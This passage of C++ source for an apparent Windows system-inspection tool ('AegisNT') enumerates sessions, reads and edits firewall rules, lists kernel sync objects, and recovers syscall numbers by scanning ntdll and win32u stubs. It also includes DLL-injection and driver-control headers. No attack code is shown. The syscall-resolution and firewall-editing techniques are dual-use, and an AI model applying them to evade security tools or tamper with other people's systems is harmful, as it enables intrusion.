#include <QApplication>
#include <QAction>
#include <QClipboard>
#include <QColorDialog>
#include <QComboBox>
#include <QCompleter>
#include <QDesktopServices>
#include <QDateTime>
#include <QDialog>
#include <QDialogButtonBox>
#include <QDir>
#include <QFile>
#include <QFileDialog>
#include <QFileInfo>
#include <QFileSystemModel>
#include <QFont>
#include <QFrame>
#include <QGridLayout>
#include <QHeaderView>
#include <QInputDialog>
#include <QLabel>
#include <QListWidget>
#include <QLocale>
#include <QMessageBox>
#include <QPainter>
#include <QPaintEvent>
#include <QPointer>
#include <QPixmap>
#include <QProgressBar>
#include <QProcess>
#include <QProcessEnvironment>
#include <QCryptographicHash>
#include <QHostAddress>
#include <QRegularExpression>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QRandomGenerator>
#include <QSaveFile>
#include <QScreen>
#include <QSignalBlocker>
#include <QShowEvent>
#include <QSet>
#include <QSplitter>
#include <QStackedWidget>
#include <QStandardPaths>
#include <QStorageInfo>
#include <QStyle>
#include <QSysInfo>
#include <QTableWidgetItem>
#include <QTabWidget>
#include <QTcpSocket>
#include <QTextCursor>
#include <QTextCharFormat>
#include <QTextEdit>
#include <QThread>
#include <QTimer>
#include <QTreeView>
#include <QTreeWidget>
#include <QUrl>
#include <QVBoxLayout>
#include <QMoveEvent>

#include <QFluent/CardWidget.h>
#include <QFluent/CheckBox.h>
#include <QFluent/ComboBox.h>
#include <QFluent/DateTime/DatePicker.h>
#include <QFluent/DateTime/TimePicker.h>
#include <QFluent/Dialog/MessageBoxBase.h>
#include <QFluent/FluentIcon.h>
#include <QFluent/IconWidget.h>
#include <QFluent/InfoBar.h>
#include <QFluent/Label.h>
#include <QFluent/LineEdit.h>
#include <QFluent/Menu/RoundMenu.h>
#include <QFluent/Navigation/NavigationPanel.h>
#include <QFluent/Progress/IndeterminateProgressRing.h>
#include <QFluent/PushButton.h>
#include <QFluent/ScrollArea.h>
#include <QFluent/ScrollBar.h>
#include <QFluent/Slider.h>
#include <QFluent/StackedWidget.h>
#include <QFluent/SwitchButton.h>
#include <QFluent/TabBar.h>
#include <QFluent/TableView.h>
#include <QFluent/TextEdit.h>
#include <QFluent/Theme.h>
#include <QFluent/ToolButton.h>

#include <QWKWidgets/widgetwindowagent.h>

#define NOMINMAX
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <dwmapi.h>
#include <winioctl.h>
#include <winternl.h>
#include <wtsapi32.h>
#include <netfw.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <format>
#ifdef ERROR
#undef ERROR
#endif

#include "Module/ModuleBase.h"
#include "Module/ModuleTypes.h"
#include "Module/OutputCapture.h"
#include "Platform/DriverControl.h"
#include "Platform/DllInject.h"
#include "Platform/DllMonitor.h"
#include "Platform/ETWMonitor.h"
#include "Platform/GetPEB.h"
#include "Platform/HttpCapture.h"
#include <openssl/applink.c>
#include "Platform/MonitorDrvCall.h"
#include "Platform/UserSecurityInfo.h"
#include "Platform/MultiDrvCall.h"
#include "Platform/NetMon.h"
#include "Platform/ProcessCtl.h"
#include "Platform/UserProcessCtl.h"

#include <algorithm>
#include <array>
#include <atomic>
#include <cstring>
#include <filesystem>
#include <map>
#include <memory>
#include <mutex>
#include <optional>
#include <thread>
#include <vector>

#include <openssl/evp.h>
#include <openssl/rand.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Dwmapi.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Ole32.lib")

namespace
{

#ifndef DIRECTORY_QUERY
#define DIRECTORY_QUERY 0x0001
#endif

#ifndef STATUS_NO_MORE_ENTRIES
#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)
#endif

struct PublicObjectDirectoryInformation
{
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
};

using SystemCallNameMap = std::map<ULONG, QString>;

QString SessionStateText(ULONG State)
{
    switch (static_cast<WTS_CONNECTSTATE_CLASS>(State))
    {
    case WTSActive: return "Active";
    case WTSConnected: return "Connected";
    case WTSConnectQuery: return "ConnectQuery";
    case WTSShadow: return "Shadow";
    case WTSDisconnected: return "Disconnected";
    case WTSIdle: return "Idle";
    case WTSListen: return "Listen";
    case WTSReset: return "Reset";
    case WTSDown: return "Down";
    case WTSInit: return "Init";
    default: return QString("State %1").arg(State);
    }
}

ULONG ParsePortValue(const QString &Ports)
{
    if (Ports.isEmpty())
        return 0;
    const QString FirstToken = Ports.split(',', Qt::SkipEmptyParts).value(0).trimmed();
    if (FirstToken.isEmpty() || FirstToken == "*" || FirstToken == "RPC" || FirstToken == "IPHTTPS")
        return 0;
    const QString RangeStart = FirstToken.split('-', Qt::SkipEmptyParts).value(0).trimmed();
    bool Ok = false;
    const uint Port = RangeStart.toUInt(&Ok);
    return Ok ? static_cast<ULONG>(Port) : 0;
}

std::map<ULONG, ULONG> BuildSessionProcessCounts()
{
    std::map<ULONG, ULONG> Counts;
    HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Snapshot == INVALID_HANDLE_VALUE)
        return Counts;

    PROCESSENTRY32W Entry{};
    Entry.dwSize = sizeof(Entry);
    if (Process32FirstW(Snapshot, &Entry))
    {
        do
        {
            DWORD SessionId = 0;
            if (ProcessIdToSessionId(Entry.th32ProcessID, &SessionId))
                ++Counts[static_cast<ULONG>(SessionId)];
        } while (Process32NextW(Snapshot, &Entry));
    }
    CloseHandle(Snapshot);
    return Counts;
}

bool EnumerateSessionsFallback(std::vector<std::tuple<ULONG, ULONG, ULONG, QString>> &Entries)
{
    PWTS_SESSION_INFOW Sessions = nullptr;
    DWORD Count = 0;
    if (!WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &Sessions, &Count))
        return false;

    const std::map<ULONG, ULONG> ProcessCounts = BuildSessionProcessCounts();
    for (DWORD Index = 0; Index < Count; ++Index)
    {
        const WTS_SESSION_INFOW &Session = Sessions[Index];
        QString WinStation = Session.pWinStationName ? QString::fromWCharArray(Session.pWinStationName) : QString();
        if (WinStation.isEmpty())
        {
            LPWSTR Buffer = nullptr;
            DWORD Bytes = 0;
            if (WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, Session.SessionId, WTSWinStationName, &Buffer, &Bytes) && Buffer)
            {
                WinStation = QString::fromWCharArray(Buffer);
                WTSFreeMemory(Buffer);
            }
        }
        Entries.emplace_back(static_cast<ULONG>(Session.SessionId),
                             static_cast<ULONG>(Session.State),
                             ProcessCounts.contains(static_cast<ULONG>(Session.SessionId))
                                 ? ProcessCounts.at(static_cast<ULONG>(Session.SessionId))
                                 : 0,
                             WinStation);
    }
    WTSFreeMemory(Sessions);
    return true;
}

bool EnumerateFirewallRulesFallback(std::vector<std::tuple<QString, ULONG, ULONG, ULONG, QString>> &Entries)
{
    const HRESULT InitHr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    const bool CoInitialized = SUCCEEDED(InitHr);
    const bool ComReady = SUCCEEDED(InitHr) || InitHr == RPC_E_CHANGED_MODE;
    if (!ComReady)
        return false;

    INetFwPolicy2 *Policy = nullptr;
    HRESULT Hr = CoCreateInstance(__uuidof(NetFwPolicy2), nullptr, CLSCTX_INPROC_SERVER,
        __uuidof(INetFwPolicy2), reinterpret_cast<void **>(&Policy));
    if (FAILED(Hr))
    {
        if (CoInitialized)
            CoUninitialize();
        return false;
    }

    INetFwRules *Rules = nullptr;
    Hr = Policy->get_Rules(&Rules);
    if (FAILED(Hr) || Rules == nullptr)
    {
        Policy->Release();
        if (CoInitialized)
            CoUninitialize();
        return false;
    }

    IUnknown *EnumUnknown = nullptr;
    Hr = Rules->get__NewEnum(&EnumUnknown);
    if (FAILED(Hr) || EnumUnknown == nullptr)
    {
        Rules->Release();
        Policy->Release();
        if (CoInitialized)
            CoUninitialize();
        return false;
    }

    IEnumVARIANT *Enum = nullptr;
    Hr = EnumUnknown->QueryInterface(IID_PPV_ARGS(&Enum));
    EnumUnknown->Release();
    if (FAILED(Hr) || Enum == nullptr)
    {
        Rules->Release();
        Policy->Release();
        if (CoInitialized)
            CoUninitialize();
        return false;
    }

    VARIANT Variant;
    VariantInit(&Variant);
    ULONG Added = 0;
    while (Enum->Next(1, &Variant, nullptr) == S_OK)
    {
        if (Variant.vt == VT_DISPATCH && Variant.pdispVal != nullptr)
        {
            INetFwRule *Rule = nullptr;
            if (SUCCEEDED(Variant.pdispVal->QueryInterface(__uuidof(INetFwRule), reinterpret_cast<void **>(&Rule))) && Rule != nullptr)
            {
                BSTR Name = nullptr;
                BSTR LocalPorts = nullptr;
                NET_FW_ACTION Action = NET_FW_ACTION_BLOCK;
                long Protocol = 0;
                VARIANT_BOOL Enabled = VARIANT_FALSE;
                NET_FW_RULE_DIRECTION Direction = NET_FW_RULE_DIR_IN;

                Rule->get_Name(&Name);
                Rule->get_Action(&Action);
                Rule->get_Protocol(&Protocol);
                Rule->get_LocalPorts(&LocalPorts);
                Rule->get_Enabled(&Enabled);
                Rule->get_Direction(&Direction);

                const QString NameText = Name ? QString::fromWCharArray(Name) : QString();
                const QString PortsText = LocalPorts ? QString::fromWCharArray(LocalPorts) : QString();
                const QString StateText = QString("%1 / %2")
                    .arg(Enabled == VARIANT_TRUE ? "Enabled" : "Disabled")
                    .arg(Direction == NET_FW_RULE_DIR_OUT ? "Outbound" : "Inbound");
                Entries.emplace_back(NameText,
                                     static_cast<ULONG>(Action == NET_FW_ACTION_ALLOW ? 1 : 0),
                                     static_cast<ULONG>(Protocol),
                                     ParsePortValue(PortsText),
                                     StateText);
                ++Added;

                if (Name) SysFreeString(Name);
                if (LocalPorts) SysFreeString(LocalPorts);
                Rule->Release();
            }
        }
        VariantClear(&Variant);
    }

    Enum->Release();
    Rules->Release();
    Policy->Release();
    if (CoInitialized)
        CoUninitialize();
    return Added > 0;
}

bool WithFirewallPolicy(const std::function<bool(INetFwPolicy2 *)> &Callback)
{
    const HRESULT InitHr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    const bool CoInitialized = SUCCEEDED(InitHr);
    const bool ComReady = SUCCEEDED(InitHr) || InitHr == RPC_E_CHANGED_MODE;
    if (!ComReady)
        return false;
    INetFwPolicy2 *Policy = nullptr;
    const HRESULT Hr = CoCreateInstance(__uuidof(NetFwPolicy2), nullptr, CLSCTX_INPROC_SERVER,
        __uuidof(INetFwPolicy2), reinterpret_cast<void **>(&Policy));
    if (FAILED(Hr) || Policy == nullptr)
    {
        if (CoInitialized)
            CoUninitialize();
        return false;
    }
    const bool Result = Callback(Policy);
    Policy->Release();
    if (CoInitialized)
        CoUninitialize();
    return Result;
}

bool AddFirewallRuleFallback(const QString &Name, ULONG Action, ULONG Protocol, ULONG Port)
{
    return WithFirewallPolicy([&](INetFwPolicy2 *Policy) {
        INetFwRules *Rules = nullptr;
        if (FAILED(Policy->get_Rules(&Rules)) || Rules == nullptr)
            return false;

        INetFwRule *Rule = nullptr;
        const HRESULT CreateHr = CoCreateInstance(__uuidof(NetFwRule), nullptr, CLSCTX_INPROC_SERVER,
            __uuidof(INetFwRule), reinterpret_cast<void **>(&Rule));
        if (FAILED(CreateHr) || Rule == nullptr)
        {
            Rules->Release();
            return false;
        }

        const std::wstring RuleName = Name.toStdWString();
        const std::wstring PortText = std::to_wstring(Port);
        BSTR NameBstr = SysAllocString(RuleName.c_str());
        BSTR PortBstr = SysAllocString(PortText.c_str());
        BSTR DescriptionBstr = SysAllocString(L"AegisNT firewall rule");
        Rule->put_Name(NameBstr);
        Rule->put_Description(DescriptionBstr);
        Rule->put_Protocol(static_cast<long>(Protocol));
        Rule->put_LocalPorts(PortBstr);
        Rule->put_Action(Action == 0 ? NET_FW_ACTION_BLOCK : NET_FW_ACTION_ALLOW);
        Rule->put_Direction(NET_FW_RULE_DIR_IN);
        Rule->put_Profiles(NET_FW_PROFILE2_ALL);
        Rule->put_Enabled(VARIANT_TRUE);
        const HRESULT AddHr = Rules->Add(Rule);

        SysFreeString(NameBstr);
        SysFreeString(PortBstr);
        SysFreeString(DescriptionBstr);
        Rule->Release();
        Rules->Release();
        return SUCCEEDED(AddHr);
    });
}

bool RemoveFirewallRuleFallback(const QString &Name)
{
    return WithFirewallPolicy([&](INetFwPolicy2 *Policy) {
        INetFwRules *Rules = nullptr;
        if (FAILED(Policy->get_Rules(&Rules)) || Rules == nullptr)
            return false;
        const std::wstring RuleName = Name.toStdWString();
        BSTR NameBstr = SysAllocString(RuleName.c_str());
        const HRESULT Hr = Rules->Remove(NameBstr);
        SysFreeString(NameBstr);
        Rules->Release();
        return SUCCEEDED(Hr);
    });
}

bool SetFirewallRuleEnabledFallback(const QString &Name, bool Enabled)
{
    return WithFirewallPolicy([&](INetFwPolicy2 *Policy) {
        INetFwRules *Rules = nullptr;
        if (FAILED(Policy->get_Rules(&Rules)) || Rules == nullptr)
            return false;
        const std::wstring RuleName = Name.toStdWString();
        BSTR NameBstr = SysAllocString(RuleName.c_str());
        INetFwRule *Rule = nullptr;
        const HRESULT ItemHr = Rules->Item(NameBstr, &Rule);
        SysFreeString(NameBstr);
        Rules->Release();
        if (FAILED(ItemHr) || Rule == nullptr)
            return false;
        const HRESULT Hr = Rule->put_Enabled(Enabled ? VARIANT_TRUE : VARIANT_FALSE);
        Rule->Release();
        return SUCCEEDED(Hr);
    });
}

bool QueryDirectorySyncObjects(const wchar_t *Path, ULONG DirectoryId,
                               std::vector<std::tuple<QString, QString, ULONG>> &Entries)
{
    using NtOpenDirectoryObjectFn = NTSTATUS (NTAPI *)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    using NtQueryDirectoryObjectFn = NTSTATUS (NTAPI *)(HANDLE, PVOID, ULONG, BOOLEAN, BOOLEAN, PULONG, PULONG);

    static const NtOpenDirectoryObjectFn NtOpenDirectoryObjectPtr =
        reinterpret_cast<NtOpenDirectoryObjectFn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtOpenDirectoryObject"));
    static const NtQueryDirectoryObjectFn NtQueryDirectoryObjectPtr =
        reinterpret_cast<NtQueryDirectoryObjectFn>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryObject"));
    if (NtOpenDirectoryObjectPtr == nullptr || NtQueryDirectoryObjectPtr == nullptr)
        return false;

    UNICODE_STRING DirName;
    DirName.Buffer = const_cast<PWSTR>(Path);
    DirName.Length = static_cast<USHORT>(wcslen(Path) * sizeof(wchar_t));
    DirName.MaximumLength = DirName.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES Attributes;
    InitializeObjectAttributes(&Attributes, &DirName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    HANDLE Directory = nullptr;
    if (NtOpenDirectoryObjectPtr(&Directory, DIRECTORY_QUERY, &Attributes) < 0)
        return false;

    bool Added = false;
    ULONG Context = 0;
    BOOLEAN Restart = TRUE;
    BYTE Buffer[8192];
    for (;;)
    {
        ULONG Returned = 0;
        const NTSTATUS Status = NtQueryDirectoryObjectPtr(Directory, Buffer, sizeof(Buffer), TRUE, Restart, &Context, &Returned);
        if (Status == STATUS_NO_MORE_ENTRIES)
            break;
        if (Status < 0)
            break;
        Restart = FALSE;

        const auto *Info = reinterpret_cast<const PublicObjectDirectoryInformation *>(Buffer);
        if (Info->Name.Buffer == nullptr || Info->TypeName.Buffer == nullptr)
            continue;

        const QString Type = QString::fromWCharArray(Info->TypeName.Buffer, Info->TypeName.Length / sizeof(wchar_t));
        if (!Type.startsWith("Mutant", Qt::CaseInsensitive) &&
            !Type.startsWith("Event", Qt::CaseInsensitive) &&
            !Type.startsWith("Semaphore", Qt::CaseInsensitive))
            continue;

        const QString Name = QString::fromWCharArray(Info->Name.Buffer, Info->Name.Length / sizeof(wchar_t));
        Entries.emplace_back(Name, Type, DirectoryId);
        Added = true;
    }

    CloseHandle(Directory);
    return Added;
}

bool EnumerateSyncObjectsFallback(std::vector<std::tuple<QString, QString, ULONG>> &Entries)
{
    bool Success = QueryDirectorySyncObjects(L"\\BaseNamedObjects", 0, Entries);
    DWORD SessionId = 0;
    if (ProcessIdToSessionId(GetCurrentProcessId(), &SessionId) && SessionId != 0)
    {
        const std::wstring SessionPath = std::format(L"\\Sessions\\{}\\BaseNamedObjects", SessionId);
        Success = QueryDirectorySyncObjects(SessionPath.c_str(), 1, Entries) || Success;
    }
    return Success;
}

SystemCallNameMap ParseSystemCallNames(HMODULE Module, const char *Prefix, bool ShadowTable = false)
{
    SystemCallNameMap Names;
    if (!Module)
        return Names;

    const auto *Base = reinterpret_cast<const BYTE *>(Module);
    const auto *DosHeader = reinterpret_cast<const IMAGE_DOS_HEADER *>(Base);
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return Names;
    const auto *NtHeaders = reinterpret_cast<const IMAGE_NT_HEADERS *>(Base + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return Names;
    const IMAGE_DATA_DIRECTORY &Directory =
        NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!Directory.VirtualAddress)
        return Names;

    const auto *Exports = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY *>(Base + Directory.VirtualAddress);
    const auto *NameRvas = reinterpret_cast<const DWORD *>(Base + Exports->AddressOfNames);
    const auto *Ordinals = reinterpret_cast<const WORD *>(Base + Exports->AddressOfNameOrdinals);
    const auto *FunctionRvas = reinterpret_cast<const DWORD *>(Base + Exports->AddressOfFunctions);
    const size_t PrefixLength = std::strlen(Prefix);
    for (DWORD ExportIndex = 0; ExportIndex < Exports->NumberOfNames; ++ExportIndex)
    {
        const char *Name = reinterpret_cast<const char *>(Base + NameRvas[ExportIndex]);
        if (std::strncmp(Name, Prefix, PrefixLength) != 0)
            continue;
        const DWORD FunctionRva = FunctionRvas[Ordinals[ExportIndex]];
        if (FunctionRva >= Directory.VirtualAddress &&
            FunctionRva < Directory.VirtualAddress + Directory.Size)
            continue;
        const BYTE *Stub = Base + FunctionRva;
        for (size_t Offset = 0; Offset + 5 <= 32; ++Offset)
        {
            if (Stub[Offset] != 0xB8)
                continue;
            ULONG ServiceIndex = 0;
            std::memcpy(&ServiceIndex, Stub + Offset + 1, sizeof(ServiceIndex));
            if (ShadowTable)
                ServiceIndex &= 0x0FFF;
            Names.emplace(ServiceIndex, QString::fromLatin1(Name));
            break;
        }
    }
    return Names;
}

const SystemCallNameMap &ServiceNamesForTable(int TableKind)
{
    static const SystemCallNameMap SsdtNames =
        ParseSystemCallNames(GetModuleHandleW(L"ntdll.dll"), "Nt");
    static const HMODULE Win32uModule = LoadLibraryW(L"win32u.dll");
    static const SystemCallNameMap ShadowSsdtNames =
        ParseSystemCallNames(Win32uModule, "Nt", true);
    return TableKind == SYSTEM_TABLE_KIND_SSDT ? SsdtNames : ShadowSsdtNames;
}

QString IdtVectorName(ULONG Vector)
{
    static const std::array<const char *, 22> ExceptionNames{
        "Divide Error", "Debug", "NMI Interrupt", "Breakpoint", "Overflow", "BOUND Range Exceeded",
        "Invalid Opcode", "Device Not Available", "Double Fault", "Coprocessor Segment Overrun",
        "Invalid TSS", "Segment Not Present", "Stack-Segment Fault", "General Protection Fault",
        "Page Fault", "Reserved", "x87 Floating-Point Exception", "Alignment Check", "Machine Check",
        "SIMD Floating-Point Exception", "Virtualization Exception", "Control Protection Exception"};
    if (Vector < ExceptionNames.size())
        return QString::fromLatin1(ExceptionNames[Vector]);
    if (Vector >= 0x20 && Vector <= 0x2F)
        return QString("Hardware IRQ %1").arg(Vector - 0x20);
    if (Vector == 0x80)
        return "Legacy System Call";
    return QString("Interrupt Gate 0x%1").arg(Vector, 2, 16, QLatin1Char('0')).toUpper();
}

QString GdtDescriptorName(ULONG Index)
{
    switch (Index)
    {
    case 0: return "Null Descriptor";
    case 1: return "Kernel Code Segment";
    case 2: return "Kernel Data Segment";
    case 3: return "User Data Segment";
    case 4: return "User Code Segment";
    case 5: return "TSS Descriptor Low";
    case 6: return "TSS Descriptor High";
    default: return QString("GDT Selector 0x%1").arg(Index * 8, 4, 16, QLatin1Char('0')).toUpper();
    }
}

QString SystemTableEntryName(int TableKind, const SYSTEM_TABLE_ENTRY &Entry)
{
    if (TableKind == SYSTEM_TABLE_KIND_IDT)
        return IdtVectorName(Entry.Index);
    if (TableKind == SYSTEM_TABLE_KIND_IO_TIMER)
    {
        static const std::array<const char *, 4> TimerNames{
            "KUSER_SHARED_DATA", "SystemTime", "InterruptTime", "TickCount"};
        return Entry.Index < TimerNames.size()
                   ? QString::fromLatin1(TimerNames[Entry.Index])
                   : QString("KUSER_SHARED_DATA field 0x%1").arg(Entry.Index, 0, 16).toUpper();
    }
    if (TableKind == SYSTEM_TABLE_KIND_SSDT || TableKind == SYSTEM_TABLE_KIND_SHADOW_SSDT)
    {
        const SystemCallNameMap &Names = ServiceNamesForTable(TableKind);
        const auto Name = Names.find(Entry.Index);
        if (Name != Names.end())
            return Name->second;
        return QString("Unexported system service 0x%1").arg(Entry.Index, 0, 16).toUpper();
    }
    if (TableKind == SYSTEM_TABLE_KIND_GDT)
        return GdtDescriptorName(Entry.Index);
    return "Unknown table entry";
}

QString FormatPeTimeDateStamp(ULONG TimeDateStamp)
{
    if (TimeDateStamp == 0)
        return "0";

    const QDateTime Time = QDateTime::fromSecsSinceEpoch(static_cast<qint64>(TimeDateStamp), Qt::UTC);
    if (!Time.isValid())
        return QString("0x%1").arg(TimeDateStamp, 8, 16, QLatin1Char('0')).toUpper();
    return QString("0x%1 | %2 UTC")
        .arg(TimeDateStamp, 8, 16, QLatin1Char('0')).toUpper()
        .arg(Time.toString("yyyy-MM-dd HH:mm:ss"));
}

QString RandomInformationQuote()
{
    static const std::array<const char *, 36> Quotes{
        "Stay curious. Small signals reveal the big picture.",
        "Good tools turn friction into momentum.",
        "Clarity first. Speed follows.",
        "Measure what changed before changing more.",
        "Quiet systems still leave useful traces.",
        "Precision is faster than repetition.",
        "A clean view makes hard problems smaller.",
        "Inspect deeply, act deliberately.",
        "Patterns appear when noise is given structure.",
        "Strong diagnostics are a form of leverage.",
        "Reliable workflows beat dramatic fixes.",
        "Every interface teaches a habit.",
        "Evidence reduces guesswork.",
        "Readable systems are easier to defend.",
        "Useful detail arrives before perfect detail.",
        "The fastest path is often the clearest one.",
        "Small observability wins compound quickly.",
        "Better defaults create calmer operations.",
        "Well-lit data leaves fewer blind corners.",
        "A stable baseline makes anomalies obvious.",
        "Context turns raw output into decisions.",
        "Good instrumentation shortens every investigation.",
        "Strong systems are legible under pressure.",
        "The right summary saves ten deeper clicks.",
        "Neat structure is a performance feature.",
        "Confidence comes from verifiable detail.",
        "Useful interfaces make important things visible.",
        "Diagnosis improves when the signal stays close.",
        "Simplicity scales better than cleverness.",
        "Healthy feedback loops keep systems honest.",
        "A clear trace is worth a fast guess.",
        "Consistency is a quiet kind of speed.",
        "The best tooling reduces hesitation.",
        "Tidy surfaces make complex internals approachable.",
        "Visibility is the first step toward control.",
        "Careful observation outperforms noisy reaction."};
    return QString::fromLatin1(Quotes[QRandomGenerator::global()->bounded(static_cast<int>(Quotes.size()))]);
}

constexpr int KSidebarWidth = 272;
const QColor KAccent("#40BEE6");
const QColor KAppBackground("#F5F5F9");
const QColor KSurfaceSoft("#EFEFF5");
const QColor KTextPrimary("#17171B");
const QColor KTextMuted("#626269");
QJsonObject Configuration;

QString MonitorTimestamp(const FILETIME &Timestamp);
QString MonitorTimestamp(const LARGE_INTEGER &Timestamp);

QString ConfigurationPath()
{
    return QCoreApplication::applicationDirPath() + "/Data/Config.json";
}

void LoadConfiguration()
{
    QFile File(ConfigurationPath());
    if (!File.open(QIODevice::ReadOnly))
        return;
    const QJsonDocument Document = QJsonDocument::fromJson(File.readAll());
    if (Document.isObject())
        Configuration = Document.object();
}

void SaveConfiguration()
{
    QDir().mkpath(QFileInfo(ConfigurationPath()).absolutePath());
    QSaveFile File(ConfigurationPath());
    if (!File.open(QIODevice::WriteOnly))
        return;
    File.write(QJsonDocument(Configuration).toJson(QJsonDocument::Indented));
    File.commit();
}

QJsonValue ConfigurationValue(const QString &Section, const QString &Key, const QJsonValue &Fallback);
QColor ConfiguredColor(const QString &Key, const QColor &Fallback);
PushButton *MakeButton(const QString &Text, bool Primary = false);
FluentLabelBase *MakeLabel(const QString &Text, int PixelSize, const QColor &Color,
                           QFont::Weight Weight = QFont::Normal);
void ConfigureToolbarLayout(QHBoxLayout *Layout, int Spacing = 8);
void InstallFluentScrollBar(QAbstractScrollArea *Area, Qt::Orientation Orientation);
QString ApplicationStyleSheet(int MaterialOverride = -1);
void ShowSuccessNotice(QWidget *Parent, const QString &Title, const QString &Content);
void QueueThemeApply(QWidget *Window, bool SaveChanges = false, bool UpdateWindow = false);

struct ThemePalette
{
    QColor Accent;
    QColor AccentHover;
    QColor AccentPressed;
    QColor PageBackground;
    QColor CardSurface;
    QColor ElevatedSurface;
    QColor SunkenSurface;
    QColor InputSurface;
    QColor TableSurface;
    QColor PopupSurface;
    QColor Border;
    QColor Divider;
    QColor Text;
    QColor MutedText;
    QColor SelectionText;
    QColor Danger;
    QColor Warning;
    QColor Success;
};

constexpr bool KDefaultThemeDarkMode = false;
constexpr int KDefaultThemeCornerRadius = 8;
constexpr int KDefaultThemeDensity = 98;
constexpr int KDefaultThemeFontScale = 100;
constexpr int KDefaultThemeWallpaperOpacity = 28;
constexpr int KDefaultThemeBackgroundMaterial = 1;

const ThemePalette &DefaultThemePalette()
{
    static const ThemePalette Palette{
        QColor("#2E6CFF"),
        QColor("#3E7BFF"),
        QColor("#2458D9"),
        QColor("#F4F6FA"),
        QColor("#FFFFFF"),
        QColor("#F8FAFD"),
        QColor("#EDF1F7"),
        QColor("#FFFFFF"),
        QColor("#FFFFFF"),
        QColor("#FFFFFF"),
        QColor("#D7DDE8"),
        QColor("#E6EBF2"),
        QColor("#18212F"),
        QColor("#667287"),
        QColor("#FFFFFF"),
        QColor("#C53D32"),
        QColor("#D98A14"),
        QColor("#1E8A5D")};
    return Palette;
}

void ApplyDefaultThemeValues(QJsonObject &ThemeObject)
{
    const ThemePalette &Palette = DefaultThemePalette();
    ThemeObject.insert("DarkMode", KDefaultThemeDarkMode);
    ThemeObject.insert("BackgroundMaterial", KDefaultThemeBackgroundMaterial);
    ThemeObject.insert("WallpaperOpacity", KDefaultThemeWallpaperOpacity);
    ThemeObject.insert("AccentColor", Palette.Accent.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("AccentHoverColor", Palette.AccentHover.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("AccentPressedColor", Palette.AccentPressed.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("PageBackgroundColor", Palette.PageBackground.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("CardSurfaceColor", Palette.CardSurface.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("SurfaceElevatedColor", Palette.ElevatedSurface.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("SurfaceSunkenColor", Palette.SunkenSurface.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("InputSurfaceColor", Palette.InputSurface.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("TableSurfaceColor", Palette.TableSurface.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("PopupSurfaceColor", Palette.PopupSurface.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("BorderColor", Palette.Border.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("DividerColor", Palette.Divider.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("TextColor", Palette.Text.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("MutedTextColor", Palette.MutedText.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("SelectionTextColor", Palette.SelectionText.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("DangerColor", Palette.Danger.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("WarningColor", Palette.Warning.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("SuccessColor", Palette.Success.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("CornerRadius", KDefaultThemeCornerRadius);
    ThemeObject.insert("FontScale", KDefaultThemeFontScale);
    ThemeObject.insert("Density", KDefaultThemeDensity);
    ThemeObject.insert("BackgroundColor", Palette.PageBackground.name(QColor::HexRgb).toUpper());
    ThemeObject.insert("SurfaceColor", Palette.CardSurface.name(QColor::HexRgb).toUpper());
}

QColor BlendColors(const QColor &Base, const QColor &Overlay, qreal Amount)
{
    const qreal Ratio = std::clamp(Amount, 0.0, 1.0);
    return QColor::fromRgbF(
        Base.redF() * (1.0 - Ratio) + Overlay.redF() * Ratio,
        Base.greenF() * (1.0 - Ratio) + Overlay.greenF() * Ratio,
        Base.blueF() * (1.0 - Ratio) + Overlay.blueF() * Ratio,
        Base.alphaF() * (1.0 - Ratio) + Overlay.alphaF() * Ratio);
}

QColor WithAlpha(const QColor &Color, int Alpha)
{
    QColor Result = Color;
    Result.setAlpha(std::clamp(Alpha, 0, 255));
    return Result;
}

ThemePalette CurrentThemePalette()
{
    const ThemePalette &Defaults = DefaultThemePalette();
    ThemePalette Palette;
    Palette.Accent = ConfiguredColor("AccentColor", Defaults.Accent);
    Palette.AccentHover = ConfiguredColor("AccentHoverColor", Defaults.AccentHover);
    Palette.AccentPressed = ConfiguredColor("AccentPressedColor", Defaults.AccentPressed);
    Palette.PageBackground = ConfiguredColor("PageBackgroundColor",
                                             ConfiguredColor("BackgroundColor", Defaults.PageBackground));
    Palette.CardSurface = ConfiguredColor("CardSurfaceColor",
                                          ConfiguredColor("SurfaceColor", Defaults.CardSurface));
